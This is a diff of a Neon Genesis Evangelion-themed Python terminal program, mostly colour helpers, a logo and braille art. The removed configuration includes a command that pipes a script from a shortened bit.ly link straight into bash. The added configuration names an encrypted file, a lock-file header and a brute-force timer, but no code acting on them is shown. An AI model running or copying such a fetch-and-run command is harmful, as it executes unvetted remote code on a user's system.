@@ -1,141 +1,75 @@
 #!/usr/bin/env python3
 """
 NERV Terminal  —  Neon Genesis Evangelion themed TUI
-Dependencies: blessed
+Dependencies: blessed, pycryptodome
 """
-import sys, time, random, threading, subprocess
+import sys, time, random, threading, subprocess, urllib.request, struct, hashlib, secrets
+from pathlib import Path
 from blessed import Terminal
 
 term = Terminal()
 
-# ============================================================
-#  COLOUR HELPERS
-# ============================================================
-R  = lambda s: term.color_rgb(210, 20,  20)  + s + term.normal   # primary red
-DR = lambda s: term.color_rgb(100, 0,   0)   + s + term.normal   # dark red
-AM = lambda s: term.color_rgb(255, 170, 0)   + s + term.normal   # amber
-OR = lambda s: term.color_rgb(255, 100, 10)  + s + term.normal   # orange
-MU = lambda s: term.color_rgb(130, 110, 95)  + s + term.normal   # muted
-WH = lambda s: term.color_rgb(220, 210, 190) + s + term.normal   # off-white
-DI = lambda s: term.color_rgb(60,  50,  45)  + s + term.normal   # dim
-GN = lambda s: term.color_rgb(0,   200, 80)  + s + term.normal   # green
-BR = lambda s: term.color_rgb(255, 55,  55)  + s + term.normal   # bright red
-CY = lambda s: term.color_rgb(0,   190, 210) + s + term.normal   # cyan
-YL = lambda s: term.color_rgb(235, 225, 45)  + s + term.normal   # yellow
+# ———————————————————————————————————————————————————————————————
+R  = lambda s: term.color_rgb(210, 20,  20)  + s + term.normal
+DR = lambda s: term.color_rgb(100, 0,   0)   + s + term.normal
+AM = lambda s: term.color_rgb(255, 170, 0)   + s + term.normal
+OR = lambda s: term.color_rgb(255, 100, 10)  + s + term.normal
+MU = lambda s: term.color_rgb(130, 110, 95)  + s + term.normal
+WH = lambda s: term.color_rgb(220, 210, 190) + s + term.normal
+DI = lambda s: term.color_rgb(60,  50,  45)  + s + term.normal
+GN = lambda s: term.color_rgb(0,   200, 80)  + s + term.normal
+BR = lambda s: term.color_rgb(255, 55,  55)  + s + term.normal
+CY = lambda s: term.color_rgb(0,   190, 210) + s + term.normal
+YL = lambda s: term.color_rgb(235, 225, 45)  + s + term.normal
+BG_ON  = term.on_color_rgb(10, 0, 0)
 
-# Background colour used everywhere
-BG_ON   = term.on_color_rgb(10, 0, 0)          # very dark red bg
-BG_CLR  = lambda s: BG_ON + s + term.normal
+# ———————————————————————————————————————————————————————————————
+ACCESS_CODE   = '21SEP'
+BRUTE_SECONDS = 600
+RICK_URL      = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+ENC_FILE      = 'Encrypted.txt'
+MAGIC         = b'\x89TLOCK02'
 
-# ============================================================
-#  CONFIG
-# ============================================================
-ACCESS_CODE   = "NERV0"
-BRUTE_SECONDS = 10 * 60
-FINAL_CMD     = "curl -s -L https://bit.ly/3zvELNz | bash"
-LOREM = ("Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
-         "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
-         "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris "
-         "nisi ut aliquip ex ea commodo consequat.")
-
-# ============================================================
-#  NERV BLOCK LOGO  (38 chars wide)
-# ============================================================
+# ———————————————————————————————————————————————————————————————
 LOGO = [
-    "███╗   ██╗███████╗██████╗ ██╗   ██╗",
-    "████╗  ██║██╔════╝██╔══██╗██║   ██║",
-    "██╔██╗ ██║█████╗  ██████╔╝██║   ██║",
-    "██║╚██╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝",
-    "██║ ╚████║███████╗██║  ██║ ╚████╔╝ ",
-    "╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ",
+    '███╗   ██╗███████╗██████╗ ██╗   ██╗',
+    '████╗  ██║██╔════╝██╔══██╗██║   ██║',
+    '██╔██╗ ██║█████╗  ██████╔╝██║   ██║',
+    '██║╚██╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝',
+    '██║ ╚████║███████╗██║  ██║ ╚████╔╝ ',
+    '╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ',
 ]
-LOGO_W = len(LOGO[0])   # 38
+LOGO_W = len(LOGO[0])
 
-# ============================================================
-#  LEFT ART  (from art.txt  —  dense braille, 60 cols)
-# ============================================================
-LEFT_ART = """⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡉⢻⣿⣿⣿⣿⣿
-⣿⡿⠣⠋⣠⡿⣻⡿⣋⣵⢾⣿⠟⣡⡾⣹⡿⣣⣴⣿⣷⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⠿⣿⣿⣿⣿⣿⣿⣷⣽⣷⣝⢿⣿⣿⣿
-⣿⠁⣠⣾⣯⣾⣿⣿⢟⣵⣿⣫⣾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⣮⠻⣿⣿⣿⣿⣿⣿⡝⠿⣷⡄⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⢿⣿
-⠃⣼⣿⣿⣿⣿⠟⡡⠟⣻⡍⡽⢫⠇⣿⣿⠟⢸⣿⣧⢸⣿⣿⣿⣷⡙⣿⣿⣿⣿⡇⣿⣷⣶⡿⠲⠷⡄⠙⣿⣿⣿⣿⣿⣿⣎⢿⣿⣧⡙
-⣾⣿⣿⣿⡿⢋⣴⡧⢸⡟⢁⣴⣿⢸⣿⡟⣼⣿⣿⣿⣄⢻⣿⣿⣿⣷⣌⢿⣿⣿⣷⢹⣿⡏⢠⣾⣷⣌⠀⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣯⣾⣿⡋⢡⠞⣴⣿⣿⡇⣾⣿⣰⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣎⢻⣿⣿⣧⠻⣿⣆⢨⡛⢿⣷⣌⢻⣿⡆⢿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠟⣴⢋⣼⢻⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣆⢻⣿⣿⣷⡙⢿⣦⠻⣦⡙⠛⠁⢹⣿⠸⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠀⢡⣾⣿⢸⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⡏⢿⣿⠹⣿⣎⠻⠇⢸⣿⣧⣀⡄⣿⡇⣿⣿⣿⣿⣿⣿
-⣿⣿⡌⣿⠟⣠⣿⣿⣿⢸⣿⡟⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣿⡇⢸⣿⢀⢻⣿⣷⡤⡘⠿⢿⣽⠇⣿⡇⣿⣿⢻⣿⣿⣿
-⣿⣿⣿⣄⠰⢿⣿⣿⣿⠈⣿⡇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡘⣿⣿⣿⢸⣿⠃⢸⡟⣸⡆⠻⣿⣧⢹⡷⣶⣤⣾⣿⡇⣿⣿⣠⡹⣿⣿
-⢸⣿⠛⣿⣆⠈⢿⣿⣿⠀⢻⡇⠀⣄⠘⣷⡘⣿⣆⢿⣿⣿⣿⣷⠹⣿⣿⠘⡏⣸⢸⠇⣿⣿⣆⠹⣿⠀⠃⢻⣿⣿⣿⡇⢹⡇⣿⣧⠹⣿
-⡆⢿⠀⠘⢿⣆⠈⢿⣿⡆⠈⡇⠀⢹⣆⠘⢧⠘⣿⣎⢻⣿⢿⣿⣇⢹⣿⡆⢰⡿⠀⠘⢟⣛⣋⡀⢸⠄⠀⠸⣿⣿⣿⡇⢸⢣⣿⡿⢰⣿
-⣧⠘⣿⡇⠈⠻⡄⠈⠻⣷⠀⠀⠀⠶⢤⡄⢈⠀⠸⣿⡆⠙⠎⢻⣿⡆⢩⡄⣴⠆⠀⠚⠋⠉⠉⠉⠀⠀⠶⠀⢻⣿⣿⡇⠊⣼⣿⠇⢸⣿
-⣿⣆⢹⡇⣄⠀⣑⡀⠀⠈⠁⠀⢀⣴⡤⠄⠀⠀⠀⠘⣷⠀⠀⠀⠙⢿⡄⠃⣧⠀⣠⣶⡋⠁⠀⠀⢠⣄⢸⡆⠘⣿⣿⠁⢰⢏⡏⢸⣿⠟
-⣿⣿⣆⠃⢻⣧⠈⢿⣦⡀⠀⢀⠸⣿⣷⡄⠀⠀⢀⣄⠈⠃⢰⡄⠠⣄⠁⠀⢻⣾⣿⣿⣷⣤⣤⣴⣾⣿⡟⠀⠀⢿⡟⠀⣠⡞⠀⣼⠁⣼
-⣿⣿⣿⣦⠘⣿⠀⡈⠻⡿⠆⠀⠀⠺⣿⣷⣾⣿⣿⣿⣷⠀⠀⢻⣦⣙⣧⡀⠀⠻⣿⣿⣿⣿⣿⣿⡿⠋⠔⢁⠀⢸⠃⣴⠋⠀⠀⢡⣾⣿
-⣿⣿⣿⣿⣷⣿⠀⠛⠢⣴⣤⡀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⣾⣦⡹⣿⣿⣿⣦⡳⣽⣿⣿⣿⠟⢋⡄⢀⣴⠏⠀⠈⠘⠁⠀⢀⣴⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⠀⠀⠀⠘⢿⣷⣤⠀⠲⢤⣤⣬⣝⣛⣿⣿⡿⠈⣷⣿⣿⣿⣿⣿⣿⣟⣫⣴⣾⠟⠰⠋⣡⡴⠇⠀⠐⠀⠰⠿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⢆⠈⠛⠂⠁⠂⠝⡛⠿⣿⣿⣿⣵⡁⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣒⣫⣭⣤⣤⣤⣀⠀⠀⢠⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⠀⢠⠀⠀⠳⣄⠲⣶⣤⡀⠠⣤⣤⣬⣿⣿⡿⠷⠿⠿⢿⣿⡿⠟⢉⠀⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠹⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣧⠸⣧⠀⠀⣌⠣⡈⠻⣿⡀⠀⠙⠻⢿⣿⣿⣷⣶⣶⣶⣾⣷⠿⠋⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⡀⠸⣷⣌⡀⠈⠃⠀⠀⠂⠀⠉⠻⣿⣿⣿⣿⣿⣷⡗⡀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿⣮⣀⠀⢱⣤⡘⣷⣦⣦⣙⠻⠟⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⢹⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣴⣥⡌⢀⣄⢻⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣾⣿⠋⣠⣼⣿⠈⣿⢿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⢠⠘⣿⣿⣿⣿⣿⣿⣿⣧⡘⠁⣼⣿⡿⠃⣼⡟⢸
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣰⠀⡈⢠⣝⢿⣿⣿⣿⣿⣿⣟⣻⣶⣤⣤⡒⠋⣸⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣫⡵⡿⢠⡇⢠⡇⠈⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣻⣵⣾⣿⣿⣱⠇⢸⠀⡸⣰⣆⠀⢻⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣾⣿⣿⣿⣿⡿⢋⠀⣠⠞⣴⣿⣿⡆⠈⢿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⣿⡿⢋⣴⠃⣰⣿⠀⣿⡿⣫⣶⣦⣌⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⣿⣿⣿⣿⠀⣿⣿⠀⣿⣿⡀⣿⢱⣿⣿⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⡿⠀⠛⠛⠀⢹⣿⡇⠙⡼⢋⣿⣿⣿⣧⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣧⠻⣿⣿⡟⠀⠀⣄⠀⠀⣸⡿⠃⣀⣴⣿⣿⣿⣿⣿⣷⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⢡⣾⣿⣿⣿⣿⣿⣿⣷⣌⠀⠷⢉⣴⠆⠀⠘⢷⢀⣿⠟⠈⢁⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢹⣿⣿⣿⣿⣿⠿⠛⣋""".strip().splitlines()
+LEFT_ART = (
+    '⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⣿⡇⢷⢮⡡⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⡡⢻⣿⣿\n'
+    '⣿⡿⠣⠋⢠⡿⣻⡿⣋⢵⢾⣿⠿⢡⡾⣹⡿⢣⢤⣿⢷⢤⡡⢿⣿⣿⣿⣿⣿⣿⣿⢷⢤⠈⠻⠿⣿⣿⣿⣿⣿⣿⢷⢽⢷⡝⢿⣿⣿\n'
+    '⣿⠁⢠⢾⢯⢾⣿⣿⠿⢵⣿⢫⢾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⢮⠻⣿⣿⣿⣿⣿⣿⡝⠿⢷⢤⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⢷⢽⢿\n'
+    '⠃⢼⣿⣿⣿⣿⠿⡡⠿⣻⠍⡽⠋⠇⣿⣿⠿⠘⣿⢧⠘⣿⣿⣿⢷⡡⣿⣿⣿⣿⠇⣿⢷⢶⡿⠿⠲⠴⡡⣿⣿⣿⣿⣿⣿⠎⢿⣿⢧⡡\n'
+    '⢾⣿⣿⣿⡿⠋⢤⢧⠘⡿⠁⢤⣿⠘⣿⡿⢼⣿⣿⣿⢤⢻⣿⣿⣿⢷⢬⢿⣿⣿⢷⠙⣿⠏⠈⢾⢷⢬⠀⣿⣿⢾⣿⣿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⢯⢾⣿⠋⠁⠾⢤⣿⣿⠇⢾⣿⢠⣿⣿⣿⣿⣿⠎⣿⣿⣿⣿⣿⠎⢻⣿⣿⢧⠻⣿⢦⠨⡛⢿⢷⢬⢻⣿⠆⢿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⣿⣿⠿⢤⠋⢼⢻⣿⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣿⣿⣿⣿⢦⢻⣿⣿⢷⡡⢿⢦⠻⢦⡡⠁⠙⣿⠸⣿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⣿⣿⠀⠁⢾⣿⠘⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⢧⢻⣿⣿⣿⣿⣿⣿⠏⢿⣿⠹⣿⠎⠻⠇⠘⣿⢧⢠⠄⣿⠇⣿⣿⣿⣿⣿\n'
+    '⣿⣿⠌⣿⠿⢠⣿⣿⣿⠘⣿⡿⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠎⣿⣿⣿⣿⣿⣿⠇⠘⣿⠀⢻⣿⢷⢤⡡⠿⢿⢽⠇⣿⠇⣿⣿⢻⣿⣿\n'
+    '⣿⣿⣿⢤⠰⢿⣿⣿⣿⠈⣿⠇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡡⣿⣿⣿⠘⣿⠃⠘⡿⢸⠆⠻⣿⢧⠙⡿⢶⢤⢾⣿⠇⣿⣿⢠⡡⢻'
+).splitlines()
 
-ART_W = 50   # display width for both art panels
+RIGHT_ART = (
+    '⣿⡿⠃⠁⢾⣿⠘⠃⡻⢤⠀⣻⠏⠻⢿⠀⠉⢠⢤⠺⠿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⢷⡡⠻⢿⣿⣿⣿⣿⣿⣿⣿⢷⡡⢻⣿⣿⣿⣿\n'
+    '⣿⡿⠣⠋⢠⡿⣻⡿⣋⢵⢾⣿⠿⢡⡾⣹⡿⢣⢤⣿⢷⢤⡡⢿⣿⣿⣿⣿⣿⣿⣿⢷⢤⠈⠻⠿⣿⣿⣿⣿⣿⣿⢷⢽⢷⡝⢿⣿⣿\n'
+    '⣿⠁⢠⢾⢯⢾⣿⣿⠿⢵⣿⢫⢾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⢮⠻⣿⣿⣿⣿⣿⣿⡝⠿⢷⢤⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⢷⢽⢿\n'
+    '⠃⢼⣿⣿⣿⣿⠿⡡⠿⣻⠍⡽⠋⠇⣿⣿⠿⠘⣿⢧⠘⣿⣿⣿⢷⡡⣿⣿⣿⣿⠇⣿⢷⢶⡿⠿⠲⠴⡡⣿⣿⣿⣿⣿⣿⠎⢿⣿⢧⡡\n'
+    '⢾⣿⣿⣿⡿⠋⢤⢧⠘⡿⠁⢤⣿⠘⣿⡿⢼⣿⣿⣿⢤⢻⣿⣿⣿⢷⢬⢿⣿⣿⢷⠙⣿⠏⠈⢾⢷⢬⠀⣿⣿⢾⣿⣿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⢯⢾⣿⠋⠁⠾⢤⣿⣿⠇⢾⣿⢠⣿⣿⣿⣿⣿⠎⣿⣿⣿⣿⣿⠎⢻⣿⣿⢧⠻⣿⢦⠨⡛⢿⢷⢬⢻⣿⠆⢿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⣿⣿⠿⢤⠋⢼⢻⣿⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣿⣿⣿⣿⢦⢻⣿⣿⢷⡡⢿⢦⠻⢦⡡⠁⠙⣿⠸⣿⣿⣿⣿⣿⣿\n'
+    '⣿⣿⣿⣿⣿⠀⠁⢾⣿⠘⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⢧⢻⣿⣿⣿⣿⣿⣿⠏⢿⣿⠹⣿⠎⠻⠇⠘⣿⢧⢠⠄⣿⠇⣿⣿⣿⣿⣿\n'
+    '⣿⣿⠌⣿⠿⢠⣿⣿⣿⠘⣿⡿⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠎⣿⣿⣿⣿⣿⣿⠇⠘⣿⠀⢻⣿⢷⢤⡡⠿⢿⢽⠇⣿⠇⣿⣿⢻⣿⣿\n'
+    '⣿⣿⣿⢤⠰⢿⣿⣿⣿⠈⣿⠇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡡⣿⣿⣿⠘⣿⠃⠘⡿⢸⠆⠻⣿⢧⠙⡿⢶⢤⢾⣿⠇⣿⣿⢠⡡⢻'
+).splitlines()
 
-# ============================================================
-#  RIGHT ART  (EVA-01 braille)
-# ============================================================
-RIGHT_ART = """⣿⣿⣿⢟⣿⢟⣵⣾⣿⣿⠟⢋⣤⣶⠟⢉⣠⣴⠚⠟⠛⢿⣿⣿⣿⣿⣿⣿⣷⣮⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡉⢻⣿⣿⣿⣿⣿
-⣿⡿⠣⠋⣠⡿⣻⡿⣋⣵⢾⣿⠟⣡⡾⣹⡿⣣⣴⣿⣷⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠻⠿⣿⣿⣿⣿⣿⣿⣷⣽⣷⣝⢿⣿⣿⣿
-⣿⠁⣠⣾⣯⣾⣿⣿⢟⣵⣿⣫⣾⣿⢣⣿⣿⡿⣿⡿⣿⣿⣿⣮⠻⣿⣿⣿⣿⣿⣿⡝⠿⣷⡄⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⢿⣿
-⠃⣼⣿⣿⣿⣿⠟⡡⠟⣻⡍⡽⢫⠇⣿⣿⠟⢸⣿⣧⢸⣿⣿⣿⣷⡙⣿⣿⣿⣿⡇⣿⣷⣶⡿⠲⠷⡄⠙⣿⣿⣿⣿⣿⣿⣎⢿⣿⣧⡙
-⣾⣿⣿⣿⡿⢋⣴⡧⢸⡟⢁⣴⣿⢸⣿⡟⣼⣿⣿⣿⣄⢻⣿⣿⣿⣷⣌⢿⣿⣿⣷⢹⣿⡏⢠⣾⣷⣌⠀⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣯⣾⣿⡋⢡⠞⣴⣿⣿⡇⣾⣿⣰⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣎⢻⣿⣿⣧⠻⣿⣆⢨⡛⢿⣷⣌⢻⣿⡆⢿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠟⣴⢋⣼⢻⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣆⢻⣿⣿⣷⡙⢿⣦⠻⣦⡙⠛⠁⢹⣿⠸⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠀⢡⣾⣿⢸⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⡏⢿⣿⠹⣿⣎⠻⠇⢸⣿⣧⣀⡄⣿⡇⣿⣿⣿⣿⣿⣿
-⣿⣿⡌⣿⠟⣠⣿⣿⣿⢸⣿⡟⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⣿⡇⢸⣿⢀⢻⣿⣷⡤⡘⠿⢿⣽⠇⣿⡇⣿⣿⢻⣿⣿⣿
-⣿⣿⣿⣄⠰⢿⣿⣿⣿⠈⣿⡇⠀⠀⢿⡝⣿⣿⢿⣿⣿⣿⣿⡘⣿⣿⣿⢸⣿⠃⢸⡟⣸⡆⠻⣿⣧⢹⡷⣶⣤⣾⣿⡇⣿⣿⣠⡹⣿⣿
-⢸⣿⠛⣿⣆⠈⢿⣿⣿⠀⢻⡇⠀⣄⠘⣷⡘⣿⣆⢿⣿⣿⣿⣷⠹⣿⣿⠘⡏⣸⢸⠇⣿⣿⣆⠹⣿⠀⠃⢻⣿⣿⣿⡇⢹⡇⣿⣧⠹⣿
-⡆⢿⠀⠘⢿⣆⠈⢿⣿⡆⠈⡇⠀⢹⣆⠘⢧⠘⣿⣎⢻⣿⢿⣿⣇⢹⣿⡆⢰⡿⠀⠘⢟⣛⣋⡀⢸⠄⠀⠸⣿⣿⣿⡇⢸⢣⣿⡿⢰⣿
-⣧⠘⣿⡇⠈⠻⡄⠈⠻⣷⠀⠀⠀⠶⢤⡄⢈⠀⠸⣿⡆⠙⠎⢻⣿⡆⢩⡄⣴⠆⠀⠚⠋⠉⠉⠉⠀⠀⠶⠀⢻⣿⣿⡇⠊⣼⣿⠇⢸⣿
-⣿⣆⢹⡇⣄⠀⣑⡀⠀⠈⠁⠀⢀⣴⡤⠄⠀⠀⠀⠘⣷⠀⠀⠀⠙⢿⡄⠃⣧⠀⣠⣶⡋⠁⠀⠀⢠⣄⢸⡆⠘⣿⣿⠁⢰⢏⡏⢸⣿⠟
-⣿⣿⣆⠃⢻⣧⠈⢿⣦⡀⠀⢀⠸⣿⣷⡄⠀⠀⢀⣄⠈⠃⢰⡄⠠⣄⠁⠀⢻⣾⣿⣿⣷⣤⣤⣴⣾⣿⡟⠀⠀⢿⡟⠀⣠⡞⠀⣼⠁⣼
-⣿⣿⣿⣦⠘⣿⠀⡈⠻⡿⠆⠀⠀⠺⣿⣷⣾⣿⣿⣿⣷⠀⠀⢻⣦⣙⣧⡀⠀⠻⣿⣿⣿⣿⣿⣿⡿⠋⠔⢁⠀⢸⠃⣴⠋⠀⠀⢡⣾⣿
-⣿⣿⣿⣿⣷⣿⠀⠛⠢⣴⣤⡀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⣾⣦⡹⣿⣿⣿⣦⡳⣽⣿⣿⣿⠟⢋⡄⢀⣴⠏⠀⠈⠘⠁⠀⢀⣴⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⠀⠀⠀⠘⢿⣷⣤⠀⠲⢤⣤⣬⣝⣛⣿⣿⡿⠈⣷⣿⣿⣿⣿⣿⣿⣟⣫⣴⣾⠟⠰⠋⣡⡴⠇⠀⠐⠀⠰⠿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⢆⠈⠛⠂⠁⠂⠝⡛⠿⣿⣿⣿⣵⡁⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣒⣫⣭⣤⣤⣤⣀⠀⠀⢠⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⠀⢠⠀⠀⠳⣄⠲⣶⣤⡀⠠⣤⣤⣬⣿⣿⡿⠷⠿⠿⢿⣿⡿⠟⢉⠀⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠹⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣧⠸⣧⠀⠀⣌⠣⡈⠻⣿⡀⠀⠙⠻⢿⣿⣿⣷⣶⣶⣶⣾⣷⠿⠋⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⡀⠸⣷⣌⡀⠈⠃⠀⠀⠂⠀⠉⠻⣿⣿⣿⣿⣿⣷⡗⡀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣿⣿⣮⣀⠀⢱⣤⡘⣷⣦⣦⣙⠻⠟⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⢹⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣴⣥⡌⢀⣄⢻⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣾⣿⠋⣠⣼⣿⠈⣿⢿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⢠⠘⣿⣿⣿⣿⣿⣿⣿⣧⡘⠁⣼⣿⡿⠃⣼⡟⢸
